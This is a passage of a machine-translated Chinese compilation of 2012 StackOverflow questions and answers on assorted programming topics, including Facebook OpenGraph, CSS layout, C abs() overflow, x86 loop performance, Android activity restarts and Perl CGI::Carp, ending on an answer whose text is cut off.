# StackOverflow 问答 11243000-11243999

# facebook - 我需要为 OpenGraph 对象的每个实例创建一个网页/对象吗？

> ID：11243000
> 
> 赞同：0
> 
> 时间：2012-06-28T10:49:43.027
> 
> 标签：facebook, facebook-opengraph

**问题：**我是否必须针对 Facebook Open Graph 为每个“对象”实例创建一个网页？

**信息：**

我已经针对开放图形协议上`earn`的对象创建了一个操作。`badge`

我创建了一个包含以下内容并托管在 heroku 上的 php 页面：

```
<head prefix="og: http://ogp.me/ns# myapp: 
                  http://ogp.me/ns/apps/myapp#">
  <title>CarViva</title>
  <meta property="fb:app_id" content="myappid" /> 
  <meta property="og:type" content="myapp:badge" /> 
  <meta property="og:title" content="Badge" /> 
  <meta property="og:image" content="https://s-static.ak.fbcdn.net/images/devsite/attachment_blank.png" /> 
  <meta property="og:description" content="You've earned a badge!'" /> 
  <meta property="og:url" content="<myurl>/badge.php">
</head> 
```

从我的 iOS 应用程序中，我这样做是为了调用获得徽章：

```
NSLog(@"Building badge object...");
NSDictionary * theBadge = [NSDictionary dictionaryWithObjectsAndKeys:
                           @"Super Awesome badge", @"name", 
                           [NSString stringWithFormat:@"%@/badge.php",kBackEndServer], @"link",  
                           nil];

[params setValue:[theBadge objectForKey:@"link"] forKey:@"badge"];
// somehow set the badge title (and description, image) here?

[[delegate facebook] requestWithGraphPath:@"me/myapp:earn" andParams:params andHttpMethod:@"POST" andDelegate:self];
NSLog(@"Graph request posted, awaiting response"); 
```

这很好用，我可以看到该事件显示在我的新闻提要中，如下所示：

![在此处输入图像描述](../Images/e1de3e7e275052075dcacbbaaaeff9aa.png)

关于开放图，我对“对象”的含义有些困惑。

`badge`本身就是对象，但我会有各种不同的类型，例如“超级棒的徽章”、“菜鸟徽章”、“专业徽章”等。我怎样才能为其中的一个人发布动作？

**问题（稍微详细一点）：**我是否需要为我的 facebook OG 对象的每个单独实例创建一个网页，或者我是否需要为每个实例创建一个 OG 对象？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T12:54:38.100

> 问题：我是否必须针对 Facebook Open Graph 为每个“对象”实例创建一个网页？

当然可以，因为这就是 Open Graph 对象**：**包含特定对象实例数据的 URL。

# html - CSS浮动正确而不改变顺序？

> ID：11243002
> 
> 赞同：1
> 
> 时间：2012-06-28T10:49:59.600
> 
> 标签：html, css

已经有一些类似的问题，但是这些修复都没有对我有用。我想将一个`<li>`菜单浮动到右侧，但我无法让它正确执行。

**HTML**

```
 <div id="topnav"><ul class="topnavlinks"><li class="menu-474 first"><a href="/" title="Home page">Home</a></li>
 <li class="menu-540 active-trail active"><a href="/our-company" title="" class="active">Our company</a></li>
 <li class="menu-541"><a href="/news_blog" title="">Blog</a></li>
 <li class="menu-930"><a href="/faq" title="Frequently Asked Questions">FAQ</a></li>
 <li class="menu-900 last"><a href="/contact" title="Contact">Contact</a></li>
 </ul></div> 
```

**CSS**

```
#topnav { width:100%; height:14px; background:#b8b8b8; border-bottom:1px solid #989898; }
.topnavlinks { width:980px; margin:0px auto; }
.topnavlinks ul { float:right;  }
.topnavlinks li { float:left;  }
.topnavlinks a { color:#fff; text-decoration:none; padding:0px 27px; } 
```

目前它根本不会向右浮动，并且通过其他一些变化，我已经让它向右浮动，只是顺序相反。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2019-02-27T23:37:02.230

嗨，我找到了另一个解决方案，使用`display:flex`and`justify-content:flex-end`

所以在原来的问题中，而不是：

```
.topnavlinks ul {
  float:right;  
} 
```

将其更改为以下内容：

```
ul.topnavlinks {   
  display: flex;   
  justify-content: flex-end; 
} 
```

它将使导航正确浮动而不改变顺序

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T10:54:03.437

尝试添加额外的容器

**HTML**

```
<div id="topnav"><div class="cont"><ul class="topnavlinks"><li class="menu-474 first"><a href="/" title="Home page">Home</a></li>
 <li class="menu-540 active-trail active"><a href="/our-company" title="" class="active">Our company</a></li>
 <li class="menu-541"><a href="/news_blog" title="">Blog</a></li>
 <li class="menu-930"><a href="/faq" title="Frequently Asked Questions">FAQ</a></li>
 <li class="menu-900 last"><a href="/contact" title="Contact">Contact</a></li>
</ul></div></div> 
```

**CSS**

```
.cont { width:980px; margin:0px auto; }
#topnav { width:100%; height:14px; background:#b8b8b8; border-bottom:1px solid #989898; }
.topnavlinks ul { float:right;  }
.topnavlinks li { float:left;  }
.topnavlinks a { color:#fff; text-decoration:none; padding:0px 27px; } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:42:06.497

请记住，有 27px 的水平填充。这会将菜单放在右侧：

```
 #topnav { width:100%; height:14px; border-bottom:1px solid #989898; text-align:right; }

.topnavlinks { margin:0px auto; display:inline; float:right;}

.topnavlinks ul { float:right; text-align:left; }

.topnavlinks li { display:inline; text-align: left;}

.topnavlinks a { color:#fff; text-decoration:none; padding:0px 27px;} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-06-28T11:52:31.827

[http://jsfiddle.net/gVnrM/](http://jsfiddle.net/gVnrM/) [演示](http://jsfiddle.net/gVnrM/)

[这个](http://jsfiddle.net/gVnrM/2/)

# dependency-injection - StructureMap 特定的构造函数 - 应该如何初始化参数？

> ID：11243004
> 
> 赞同：1
> 
> 时间：2012-06-28T10:50:12.183
> 
> 标签：dependency-injection, inversion-of-control, structuremap

给定以下 StructureMap 注册表

```
For<ILogger>().Use(LogFactory.CreateLogger());
For<Scheduler>().Use(() => new Scheduler(ObjectFactory.GetInstance<ILogger>())); 
```

...这是提供一个的**好**方法吗？它*有效*- 但我很想知道它是否是提供容器配置提供的类型的糟糕方式，或者它是否是我在场景中的唯一选择......场景是类型本身具有其他构造函数我不能改变，也不关心——但它们是必需的，所以我需要指定这个特定的构造函数而不是使用直接的构造函数`ILogger``Scheduler`*`Scheduler``For<x>().Use<y>();`*

 ** * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T12:03:15.267

注册服务最好只有一个公共构造函数。这使得服务产生的依赖关系变得明确，并且非常清楚容器将选择哪个构造函数，并且它允许您使用更灵活的 注册类型`Use<T>()`，并使得组合根在构造函数更改时不太可能更改。

但是，正如您所说，在您的情况下，您无法更改该类型的构造函数，因此您将不得不退回。有多种方法可以使用 StructureMap 选择正确的构造函数，但注册委托是最好的方法，因为这为您提供了编译时支持。*

# extjs4.1 - Ext JS 4.1 在 itemcontextmenu 中获取列索引

> ID：11243006
> 
> 赞同：0
> 
> 时间：2012-06-28T10:50:25.523
> 
> 标签：extjs4.1

当我为网格/树的 itemcontextmenu 添加侦听器时，我可以访问视图记录、项目、索引，但是如何获取列？

我要创建的是一个 contextMenu，但前提是用户单击第一列中的项目。

这是我的监听器功能：

```
firstColumnContext: function(view,record,item,index,e,eOpts) {
        console.log(view);
        console.log(record.getName());//this works
        console.log(index);
        console.log('get column');//
}, 
```

我的概念是这样的：

```
firstColumnContext: function(view,record,item,index,e,eOpts) {
        e.stopEvent();
        if(record.get('leaf') && 'first column')
        {
                //show context menu here
        }
}, 
```

但正如我之前写的那样，我需要验证右击是否在第一列。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-29T15:28:22.887

请参阅此代码，像这样设置您的网格 viewConfig：

```
viewConfig: {
            listeners:{
                beforecellcontextmenu: function(view, tableCell, columnIndex, record, tableRow, rowIndex){
                    //your menu code here

                },
                itemcontextmenu: function(view,record,item,index,e,eOpts){
                    e.stopEvent();
                }
            }
        } 
```

列索引由 beforecellcontextmenu 事件提供，但触发的事件不提供事件本身，因此您必须结合使用这两个事件，一个停止默认菜单，另一个在您想要的情况下弹出它它显示。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-01-17T18:57:07.587

我也有这个问题。这是我为 Grids 设计的 hack，效果很好。它将单击时的鼠标位置与每列的位置进行比较，并找出它们何时重叠。

```
grid.on('itemcontextmenu', function(view, record, item, index, e) {

    var xPos = e.getXY()[0];
    var cols = view.getGridColumns();

    for(var c in cols) {

        var leftEdge = cols[c].getPosition()[0];
        var rightEdge = cols[c].getSize().width + leftEdge;

        if(xPos>=leftEdge && xPos<=rightEdge) {
            console.log(cols[c].dataIndex);
        }
    }
}); 
```

# jakarta-ee - 真实服务的模拟对象

> ID：11243008
> 
> 赞同：1
> 
> 时间：2012-06-28T10:50:44.913
> 
> 标签：jakarta-ee, testing, mocking

我有许多需要从我的应用程序访问的外部第 3 方 Web 服务，并且大多数情况下它们已关闭或不可用。我需要从本地的 xml 文件中模拟服务返回值并将其发送回，以便我可以测试应用程序中的其余层，即演示文稿、委托等。有没有一种方法可以做到这一点而无需编写一个仅用于测试目的的额外类说一个模拟对象库，它只提供一些注释，我可以标记我的生产类方法并根据说环境将其关闭，该环境将通过插入示例 xml 来模拟特定方法。例如：

```
//MockthismethodFor(env).With(sampledata).returning(...)
@Mockthismethod("test","mytestvalues.xml",something)
public something returnsomthing(string str1){
//...production code
} 
```

我检查了 EasyMock、Jmockit 但无法获得太多线索来实现上述目标。感谢您的指点或有关此的任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:14:54.377

如果您使用 CDI，您可以使用 @Alternative 来注释您的模拟服务实现 bean。更好的是，您可以编写自己的 @Mock 原型并在实际服务不可用的环境中激活它。您可以在此处找到详细信息：http: [//openejb.apache.org/examples-trunk/cdi-alternative-and-stereotypes/](http://openejb.apache.org/examples-trunk/cdi-alternative-and-stereotypes/)

# jquery - jQuery在（）和之前（）之后动画

> ID：11243010
> 
> 赞同：0
> 
> 时间：2012-06-28T10:50:55.367
> 
> 标签：jquery, animation

我正在使用来自[Github的 Table Drag n Sort 插件](https://raw.github.com/dfsq/trSortable/master/jquery.trsortable.js)

＆这是该插件的工作[小提琴](http://jsbin.com/uyedak/)

该插件通过在拖动后检测鼠标光标位置对表格进行排序。

因此，如果您向上拖动 => 它会将选定的 tr 移动到目标 div**之前**

& 如果你向下拖动 => 它在目标 div**之后移动选定的 tr**

插件看起来像这样..

```
// ...... //

    if (mouseY > lastY) {
        $(this).after($tr);
    } else {
        $(this).before($tr);
    }

// ...... // 
```

我的问题是如何为 after() 和 before() 分配动画，以便排序看起来很流畅。目前它只是立即附加 div 。

任何帮助将不胜感激 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:03:45.283

您可以设置元素`position: absolute`，`<tr>`然后动画位置更改，最后插入`$tr`到 DOM 中的新位置并删除`position: absolute`。

但是你需要计算正确的位置。

更简单的选择是：动画隐藏`$tr`，插入 DOM 并显示他。

# php - 单个应用程序的错误签名 JSON 签名

> ID：11243013
> 
> 赞同：0
> 
> 时间：2012-06-28T10:51:04.273
> 
> 标签：php, facebook, facebook-graph-api

我正在开发一个从单一来源为多个 Facebook 应用程序提供服务的应用程序。它的结构使得多个应用程序可以从运行相同代码的多台机器上提供服务——每个应用程序只更改配置。

在我的本地机器上运行这些应用程序之一可以正常运行，并且在实时服务器上运行所有有问题的应用程序也可以。

导致问题的场景是在实时服务器上运行的一个应用程序触发了无限重定向循环和错误日志中的垃圾邮件“错误签名 JSON 签名”。

由于这是一个共享代码库，并且其他应用程序都可以正常工作——查看的逻辑位置在配置中——我现在检查了 3 次——应用程序 ID、秘密和重定向参数是正确的。

所以 -**问题**：有没有人遇到过这个问题并设法解决它？关于我可以在哪里看，有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:57:35.130

显然 3 次是不够的 - 应用程序机密配置文件中有一个尾随空格。

# c - 为什么最大负整数-2147483648的绝对值还是-2147483648？

> ID：11243014
> 
> 赞同：25
> 
> 时间：2012-06-28T10:51:10.530
> 
> 标签：c, libc

abs(-2147483648) 的结果是-2147483648，不是吗？这似乎是不可接受的。

```
printf("abs(-2147483648): %d\n", abs(-2147483648)); 
```

输出：

```
abs(-2147483648): -2147483648 
```

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-06-28T13:30:49.000

该标准说`abs()`：

> 、`abs`和函数计算整数`labs`的`llabs`绝对值`j`。如果结果无法表示，则行为未定义。

结果确实无法表示，因为有符号整数的 2 的补码表示不是对称的。想想看……如果你在一个 32 位`int`，这给你 2 ^(32 个)不同的值从`INT_MIN`to `INT_MAX`。这是偶数个值。因此，如果只有一个 0，则大于 0 的值的数量不能与小于 0 的值的数量相同。因此没有`INT_MIN`与 - 值对应的正数`INT_MIN`。

所以，不能接受的是`abs(INT_MIN)`在你的平台上打电话。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-06-28T14:23:38.180

负数通常用二进制补码表示。

要将正数转换为负数，使用逻辑

```
x -> not(x)+1 
```

对于 8 位算术

01111111b 是 127，-127 变成
10000000b + 1 = 10000001b

和相反的方向 -127 10000001b 变为
01111110b + 1 = 01111111b

-128 呢？

-128 是 10000000b 并且没有它的正数对应物，因为在 8 位有符号算术中没有 128。

10000000 -> 01111111 + 1 = 10000000 和 -128

同样适用于原始问题

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2012-06-28T11:17:19.790

由于 2147483648 大于`INT_MAX`您的实现，`abs(-2147483648)`因此未定义。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-06-28T13:14:49.633

这是 GNU glibc 源代码中 abs.c 中的代码。

```
/* Return the absolute value of I.  */
int
DEFUN(abs, (i), int i)
{
  return(i < 0 ? -i : i);
} 
```

所以，abs(-2147483648) 返回 -(-2147483648) 。在 x86 中，它是通过这两条指令实现的

```
movl    $-2147483648, %eax
negl    %eax 
```

negl指令是这样实现的：num=0-num; sbb 是通过这种方式实现的：从目标中减去源，如果设置了进位标志，则额外减去 1。所以 abs(-2147483648) (十六进制是 0x80000000 ) --> -(-2147483648) --> 0-(-2147483648) 最终变成 (0x80000000) 。

negl指令详情，请访问[http://zsmith.co/intel_n.html#neg](http://zsmith.co/intel_n.html#neg)

sbb指令详情，请访问[http://web.itu.edu.tr/kesgin/mul06/intel/instr/sbb.html](http://web.itu.edu.tr/kesgin/mul06/intel/instr/sbb.html)

* * *

## 回答 #5

> 赞同：-5
> 
> 时间：2012-06-28T11:10:40.207

尝试这个

```
printf("abs(-2147483648): %u\n", abs(-2147483648)); 
```

# c++ - 为什么这个汇编代码更快？

> ID：11243015
> 
> 赞同：13
> 
> 时间：2012-06-28T10:51:12.603
> 
> 标签：c++, performance, x86, lexer, micro-optimization

我正在尝试使用词法分析器，我发现在程序的一部分中从 while 循环切换到 if 语句和 do-while 循环导致代码速度提高了约 20%，这看起来很疯狂。我将编译器生成的代码中的差异与这些程序集片段隔离开来。有谁知道为什么快速代码更快？

在程序集中，'edi' 是当前文本位置，'ebx' 是文本结尾，'isAlpha' 是一个查找表，如果字符是字母则为 1，否则为 0。

慢代码：

```
slow_loop:
00401897  cmp   edi,ebx 
00401899  je    slow_done (4018AAh) 
0040189B  movzx eax,byte ptr [edi] 
0040189E  cmp   byte ptr isAlpha (4533E0h)[eax],0 
004018A5  je    slow_done (4018AAh) 
004018A7  inc   edi  
004018A8  jmp   slow_loop (401897h) 
slow_done: 
```

快速代码：

```
fast_loop:
0040193D  inc   edi  
0040193E  cmp   edi,ebx 
00401940  je    fast_done (40194Eh) 
00401942  movzx eax,byte ptr [edi] 
00401945  cmp   byte ptr isAlpha (4533E0h)[eax],0 
0040194C  jne   fast_loop (40193Dh) 
fast_done: 
```

如果我只针对仅包含字母“a”的兆字节文本运行这些程序集片段，那么快速代码将快 30%。我的猜测是由于分支预测错误，慢代码很慢，但我认为在循环中这将是一次性成本。

这是我用来测试两个片段的程序：

```
#include <Windows.h>
#include <string>
#include <iostream>

int main( int argc, char* argv[] )
{
    static char isAlpha[256];
    for ( int i = 0; i < sizeof( isAlpha ); ++i )
        isAlpha[i] = isalpha( i ) ? 1 : 0;

    std::string test( 1024*1024, 'a' );

    const char* start = test.c_str();
    const char* limit = test.c_str() + test.size();

    DWORD slowStart = GetTickCount();
    for ( int i = 0; i < 10000; ++i )
    {
        __asm
        {
            mov edi, start
            mov ebx, limit

            inc edi

        slow_loop:
            cmp   edi,ebx
            je    slow_done
            movzx eax,byte ptr [edi]
            cmp   byte ptr isAlpha [eax],0
            je    slow_done
            inc   edi
            jmp   slow_loop

        slow_done:
        }
    }
    DWORD slowEnd = GetTickCount();
    std::cout << "slow in " << ( slowEnd - slowStart ) << " ticks" << std::endl;

    DWORD fastStart = GetTickCount();
    for ( int i = 0; i < 10000; ++i )
    {
        __asm
        {
            mov edi, start
            mov ebx, limit

        fast_loop:
            inc   edi
            cmp   edi,ebx
            je    fast_done
            movzx eax,byte ptr [edi]
            cmp   byte ptr isAlpha [eax],0
            jne   fast_loop

        fast_done:
        }
    }
    DWORD fastEnd = GetTickCount();
    std::cout << "fast in " << ( fastEnd - fastStart ) << " ticks" << std::endl;

    return 0;
} 
```

测试程序的输出是

```
slow in 8455 ticks
fast in 5694 ticks 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-06-29T09:47:08.927

抱歉，我无法在 GCC (linux) 上完全重现您的代码，但我有一些结果，我认为主要思想已保存在我的代码中。

英特尔提供了一个分析代码片段性能的工具：http: [//software.intel.com/en-us/articles/intel-architecture-code-analyzer/](http://software.intel.com/en-us/articles/intel-architecture-code-analyzer/)（英特尔 IACA）。它可以免费下载和测试。

在我的实验中，报告慢循环：

```
Intel(R) Architecture Code Analyzer Version - 2.0.1
Analyzed File - ./l2_i
Binary Format - 32Bit
Architecture  - SNB
Analysis Type - Throughput

Throughput Analysis Report
--------------------------
Block Throughput: 3.05 Cycles       Throughput Bottleneck: Port5

Port Binding In Cycles Per Iteration:
-------------------------------------------------------------------------
|  Port  |  0   -  DV  |  1   |  2   -  D   |  3   -  D   |  4   |  5   |
-------------------------------------------------------------------------
| Cycles | 0.5    0.0  | 0.5  | 1.0    1.0  | 1.0    1.0  | 0.0  | 3.0  |
-------------------------------------------------------------------------

N - port number or number of cycles resource conflict caused delay, DV - Divide
D - Data fetch pipe (on ports 2 and 3), CP - on a critical path
F - Macro Fusion with the previous instruction occurred

| Num Of |              Ports pressure in cycles               |    |
|  Uops  |  0  - DV  |  1  |  2  -  D  |  3  -  D  |  4  |  5  |    |
---------------------------------------------------------------------
|   1    |           |     |           |           |     | 1.0 | CP | cmp edi,
|   0F   |           |     |           |           |     |     |    | jz 0xb
|   1    |           |     | 1.0   1.0 |           |     |     |    | movzx ebx
|   2    |           |     |           | 1.0   1.0 |     | 1.0 | CP | cmp cl, b
|   0F   |           |     |           |           |     |     |    | jz 0x3
|   1    | 0.5       | 0.5 |           |           |     |     |    | inc edi
|   1    |           |     |           |           |     | 1.0 | CP | jmp 0xfff 
```

对于快速循环：

```
Throughput Analysis Report
--------------------------
Block Throughput: 2.00 Cycles       Throughput Bottleneck: Port5

Port Binding In Cycles Per Iteration:
-------------------------------------------------------------------------
|  Port  |  0   -  DV  |  1   |  2   -  D   |  3   -  D   |  4   |  5   |
-------------------------------------------------------------------------
| Cycles | 0.5    0.0  | 0.5  | 1.0    1.0  | 1.0    1.0  | 0.0  | 2.0  |
-------------------------------------------------------------------------

N - port number or number of cycles resource conflict caused delay, DV - Divide
D - Data fetch pipe (on ports 2 and 3), CP - on a critical path
F - Macro Fusion with the previous instruction occurred

| Num Of |              Ports pressure in cycles               |    |
|  Uops  |  0  - DV  |  1  |  2  -  D  |  3  -  D  |  4  |  5  |    |
---------------------------------------------------------------------
|   1    | 0.5       | 0.5 |           |           |     |     |    | inc edi
|   1    |           |     |           |           |     | 1.0 | CP | cmp edi,
|   0F   |           |     |           |           |     |     |    | jz 0x8
|   1    |           |     | 1.0   1.0 |           |     |     |    | movzx ebx
|   2    |           |     |           | 1.0   1.0 |     | 1.0 | CP | cmp cl, b
|   0F   |           |     |           |           |     |     |    | jnz 0xfff 
```

所以在慢循环中，JMP 是关键路径中的额外指令。所有 cmp+jz/jnz 对都被合并（宏融合）成单个 u-op。在我的代码实现中，关键资源是 Port5，它可以执行 ALU+JMP（它是唯一具有 JMP 功能的端口）。

PS：如果有人不知道端口在哪里，[第一](http://www.tektalk.org/wp-content/uploads/2011/01/Sandy-Bridge-Microarchitecture-Small.jpg) [秒](http://www.bdti.com/sites/default/files/insidedsp/articlepix/201205/SandyBridgeMicroarchitecture.png)有图片；和文章：[rwt](http://www.realworldtech.com/page.cfm?ArticleID=RWT091810191937&p=1)

PPS：IACA 有一些限制；它仅对 CPU（执行单元）的一部分进行建模，并且不考虑缓存未命中、分支错误预测、不同的惩罚、频率/功率更改、操作系统中断、执行单元的超线程争用和许多其他影响。但它是有用的工具，因为它可以让您快速了解现代英特尔 CPU 最内部的内核。它只适用于内部循环（就像这个问题中的循环一样）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-29T00:42:30.350

您的测试文本会导致循环在每次迭代中运行完成，并且快速循环的指令更少。

# android-intent - 应用程序重启 - 活动入口点

> ID：11243019
> 
> 赞同：13
> 
> 时间：2012-06-28T10:51:17.487
> 
> 标签：android-intent, android

我有一个应用程序，入口点是**“登录/启动”** `Activity`，我需要从服务器预加载新数据。这`SplashActivity`被声明为：

```
<action android:name="android.intent.action.MAIN" />
<category android:name="android.intent.category.LAUNCHER" /> 
```

在`AndroidManifest.xml`我`Application`的 `MainActivity`.

我期待，在我`Application`被操作系统或用户（使用强制停止）停止后，然后由用户重新启动，我的应用程序的入口点将`SplashActivity`再次出现，**但**系统会跳过`SplashActivity`并显示`MainActivity`.

**问题：**这是预期的行为吗？如果整个过程都停止了，我的应用程序不应该开始`SplashActivity`吗？这可以实现吗？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-06-28T16:34:29.377

实际上，这个问题及其一些答案解决了几个问题：

* * *

要回答您最初的问题，“是的，这是预期的行为”。

Android 将每个 Activity 视为一个独立的自包含实体。Android 会记住任务堆栈中的活动状态，并且它可以随时终止您的进程（其中包含您的所有活动），因为它“知道”它总是可以在需要时重建您的活动。当然，当您有一个复杂的应用程序，其中活动之间存在依赖关系和/或您有存储在`Application`类（或类似的静态/单一位置）中的全局数据时，这个概念就会失效。

当 Android 杀死你的进程时，它会记住任务中最顶层的活动，当用户返回任务时，它会重新创建进程，然后**只**重新创建任务中最顶层的活动。在你的情况下，`MainActivity`.

例如，如果您的任务堆栈如下所示：

```
StartActivity -> ActivityB -> ActivityC -> ActivityD 
```

并且您的任务进入后台并且Android会终止该进程，当用户返回任务时，只会`ActivityD`重新创建。完成后，Android将`ActivityD`重新创建`ActivityC`. 一旦`ActivityC`完成，Android 将重新创建`ActivityB`等。简而言之，当用户恢复任务时，**不会重新创建完整的堆栈。**

没有清单设置或意图标志的组合可以让您获得所需的行为。如果 Android 提供类似的东西会很好，但目前它没有。

* * *

您可以通过在应用程序派生类（或任何其他类）中使用静态（类）布尔变量来确定您的进程是否已重新启动。当进程重新启动时，此变量将始终具有该值`false`，然后您可以从任何地方检查变量的状态，并在必要时重新初始化（重新加载数据）。然后将变量设置为`true`. `true`即使您的所有活动都完成，它也会一直保留到进程被终止并重新创建。这样，您可以仅在需要时进行初始化。

您也可以将其用作从`SplashScreen`. 所以在你的所有活动中`onCreate()`，你可以检查这个布尔变量的状态，如果应用程序已经重新启动，你可以简单地重定向到`SplashScreen`这样的：

```
Intent intent = new Intent(this, SplashScreen.class);
intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
startActivity(intent); 
```

这将完成任务中的所有活动并在任务`SplashScreen`的根目录重新启动。

* * *

接下来，如果您想防止每次用户返回应用程序时都必须下载数据（当它在后台并随后被 AndroidOS 杀死时），您应该将下载的数据存储在私有缓存区域并使用它当应用程序重新启动时。如果您的进程被终止并重新启动，这可以防止必须重复下载数据。

* * *

处理此问题的另一种方法是将您的数据加载到服务中。如果您`Service`的进程正在运行，那么 Android 就不太可能杀死您的进程。您只需要确保`Service`在用户完成您的应用程序时关闭您的应用程序。

* * *

我意识到这个答案是冗长的。希望你能从中得到一些东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T10:57:35.953

可以这样做：

**1.** `SplashActivity`每次都会开始毫无疑问。

**2.**下载数据并保存检查（布尔值），表明加载已完成。您可以使用[SharedPreferences](http://developer.android.com/reference/android/content/SharedPreferences.html)。

**3.**下次检查情况并`MainActivity`立即开始。

# sendmail - 为什么lamson和sendmail可以同时监听25端口？

> ID：11243023
> 
> 赞同：0
> 
> 时间：2012-06-28T10:51:19.810
> 
> 标签：sendmail, lamson

我在 25 端口启动 sendmail。然后在 25 端口启动 lamson（另一个 SMTP 服务器）。它们都工作。为什么他们可以监听同一个端口？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T10:58:11.913

只有一个应用程序可以在一个端口上侦听一次。

# marionette - Backbone.Marionette CollectionView/CompositeView 渲染

> ID：11243026
> 
> 赞同：0
> 
> 时间：2012-06-28T10:51:22.133
> 
> 标签：marionette

这个问题是这个[相关问题](https://stackoverflow.com/questions/11160421/how-to-render-view-with-backbone-marionette)的延伸。

听从 Derick 的建议，我的数据现在有了正确的形状。即我有一个对象的集合`Department`，每个对象都有一个`Users`.

`CollectionView`再次按照 Derick 的建议，我正在尝试渲染`CompositeView`a

我的收藏视图看起来像这样

```
class UserListView extends Backbone.Marionette.CollectionView
    itemView: UserCompositeView
    id: "user-list"  

    appendHtml: (collectionView, itemView, index) =>
      itemModel = @collection.at(index)
      itemView = new UserCompositeView
        model: itemModel 
        collection: itemModel.get("users")

      collectionView.$el.append itemView.el 
```

我的`Composite View`样子是这样的：

```
 class UserCompositeView extends Backbone.Marionette.CompositeView
    itemView: UserItemView
    itemViewContainer: '#users' 
```

如果我不覆盖 appendHtml 方法，那么视图会呈现，但它只会呈现`Department`模型的属性。它不会呈现`users`集合。

当我重写中的`appendHtml`方法时，`CollectionView`我可以传递一个模型（一个`Department`对象）和一个集合，`users`但它们中的一个或两个似乎是错误的对象类型，因为该`Marionette bindTo`函数抱怨该对象没有“on”方法。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T16:23:39.280

返回什么`itemModel.get("users")`？

如果这是返回一个 JavaScript 数组或对象字面量，那就是问题所在。您必须传递一个有效的 Backbone.Collection 作为集合参数，而不仅仅是一个对象数组。

`collection: new Backbone.Collection(itemModel.get("users"))`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-12T02:24:03.280

您还可以考虑使用[骨干关系](http://backbonerelational.org/)，它可以让您定义具有子模型或子集合的模型。

# iphone - 可以将 TabBarController 添加到子视图吗？

> ID：11243027
> 
> 赞同：0
> 
> 时间：2012-06-28T10:51:23.743
> 
> 标签：iphone

我正在开发一个新的应用程序。在我的应用程序中，它首先需要签名和注册页面。之后它将显示标签栏控制器。那么是否可以在不使用 presentModelViewController 的情况下在 thirdView 中添加 tabBarController？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T10:54:54.943

您通常创建您的`UITabBarController`，填写所需的`viewcontrollers`

例如你有一个`UITabBarController`被叫`tabBar`

你可以添加`tabBar.view`到任何`UIView`

```
[self.view addSubView:tabBar.view]; 
```

# perl - 在 Perl 中，如何禁用在所需脚本中加载的 CGI::Carp？

> ID：11243028
> 
> 赞同：6
> 
> 时间：2012-06-28T10:51:23.760
> 
> 标签：perl, cgi

我有一个要在命令行上运行的小型 Perl 程序。我需要`require`其他人编写的另一个 Perl 脚本（不是模块）。这反过来又`require`是其他一些脚本。（我对它的工作方式无能为力）。

现在，其中一个脚本包含并包含在其中真的很**烦人**。我不要那个。每次出现问题时，我的控制台上都会显示15 行，这真的让我很紧张。我试过了`use CGI;``use CGI::Carp qw(fatalsToBrowser)``500 Internal Server Error page`

```
require 'otherscript.pl';
no CGI;
no CGI::Carp; 
```

和

```
no CGI;
no CGI::Carp;
require 'otherscript.pl'; 
```

卸载它，就像[使用文档](http://perldoc.perl.org/functions/use.html)描述的那样，但它不起作用。

我可以以某种方式操纵符号表或做一些其他的魔法来摆脱它吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T13:04:40.900

通过将`$CGI::Carp::TO_BROWSER`变量设置为，`0`您可以禁止打印 HTML 版本的 die 消息。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-28T11:35:41.693

CGI::Carp 包中没有`unimport`例程，所以`no`没有效果。`import`手动撤消例程的相关部分。

词法范围（见[警告](http://p3rl.org/CGI%3a%3aCarp#DOING-MORE-THAN-PRINTING-A-MESSAGE-IN-THE-EVENT-OF-PERL-ERRORS)）：

```
local $main::SIG{__DIE__} = \&CGI::Carp::realdie; 
```

全球范围：

```
CGI::Carp::set_die_handler(\&CGI::Carp::realdie); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-28T13:49:09.150

使用的代码`fatalsToBrowser`来自哪里？虽然`fatalsToBrowser`是一个非常有用的开发工具，但它应该只用于开发。在生产环境中，可以说这`fatalsToBrowser`是一种安全风险，因为它可能会给试图破解您服务器的人提供太多信息。

因此，请务必使用其他人提到的技巧将其关闭。但是您还应该尽一切可能确保更改有问题的代码，使其不会`fatalsToBrowser`在生产中使用。

# c++ - 将功能逻辑分解为子功能

> ID：11243034
> 
> 赞同：2
> 
> 时间：2012-06-28T10:51:46.253
> 
> 标签：c++, c

将函数拆分成更小的子函数到代码中，会影响程序的效率吗？在降低函数的圈复杂度的同时，我将函数分解为更小的部分，并为此使用了辅助函数和内联函数。

```
void functionParent(arguments)
{

    intialCheckFunction(arguments);
    functionOne();
    functionTwo();
    functionThree();
    functionFour();

    return STATUS;
}

void functionOne()
{
   /*follows unary Principle.*/
} 
```

我担心的是堆栈指针，SP 的频繁切换是否会大大降低程序的效率，或者可以忽略不计。上面的函数One,Two,.. 中包含一元逻辑。请在两种`enter code here`情况下回复，C 以及 C++

* * *

## 回答 #1

> 赞同：3
> 
